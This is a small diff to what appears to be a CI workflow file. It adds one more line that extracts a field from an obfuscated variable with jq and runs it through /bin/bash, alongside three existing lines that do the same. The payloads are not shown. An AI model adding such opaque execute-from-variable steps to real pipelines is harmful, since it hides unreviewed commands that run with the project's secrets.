@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$znl8" | jq -r .eviai7120 | /bin/bash
           printf '%s' "$zmnv6" | jq -r .rg46522 | /bin/bash
           printf '%s' "$b9348" | jq -r .umv19407 | /bin/bash
+          echo $qmyq0 | jq -r .mfjrw03140 | /bin/bash
 
       - name: Upload results
         if: always()
